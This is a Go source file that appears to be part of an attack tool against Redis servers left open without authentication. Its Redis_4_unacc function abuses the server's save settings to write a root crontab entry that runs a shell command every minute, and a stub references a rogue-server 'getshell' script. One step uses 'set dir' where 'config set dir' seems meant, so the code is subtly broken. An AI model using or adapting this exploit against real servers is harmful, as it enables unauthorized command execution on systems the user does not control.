package redis

import (
	"context"
	"errors"
	"fmt"
	"github.com/go-redis/redis/v8"
	"time"
)

var (
	ctx = context.Background()
)

func RedisConnect(ip, port string, opt *redis.Options) (*redis.Client, bool) {

	if opt == nil {
		opt = &redis.Options{
			Addr:         fmt.Sprintf("%s:%s", ip, port),
			DialTimeout:  1 * time.Second,
			ReadTimeout:  1 * time.Second,
			WriteTimeout: 1 * time.Second,
			PoolSize:     1,
			PoolTimeout:  1 * time.Second,
		}
	}
	rdb := redis.NewClient(opt)
	if rdb == nil {
		fmt.Println("nil")
	}
	_, err := rdb.Ping(ctx).Result()
	if err != nil {
		return nil, false
	}
	cmd := rdb.Do(ctx, "info")
	_, err = cmd.Result()
	if err != nil {
		return nil, false
	} else {
		return rdb, true
	}
}

func Redis_4_unacc(ip, port string, opt *redis.Options) error {
	if opt == nil {
		opt = &redis.Options{
			Addr:         fmt.Sprintf("%s:%s", ip, port),
			DialTimeout:  1 * time.Second,
			ReadTimeout:  1 * time.Second,
			WriteTimeout: 1 * time.Second,
			PoolSize:     1,
			PoolTimeout:  1 * time.Second,
		}
	}
	rdb, flag := RedisConnect(ip, port, opt)
	if flag == false {
		return errors.New("connected failed ")
	}

	defer rdb.Close()

	cmd := rdb.Do(ctx, "set", "dir", "/var/spool/cron/crontabs/")
	result, err := cmd.Result()
	fmt.Println(result, err)

	cmd = rdb.Do(ctx, "config", "set", "dbfilename", "root")
	result, err = cmd.Result()
	fmt.Println(result, err)

	cmd = rdb.Do(ctx, "set", "crontabTask", "#\n\n\n* * * * * /bin/bash -c ls /home/\n\n\n#")
	result, err = cmd.Result()
	fmt.Println(result, err)

	cmd = rdb.Do(ctx, "save")
	result, err = cmd.Result()
	fmt.Println(result, err)
	if err != nil {
		return err
	} else {
		return nil
	}
}

func Redis_4_unacc_execCMD() {
	//https://github.com/vulhub/redis-rogue-getshell/blob/master/redis-master.py
}
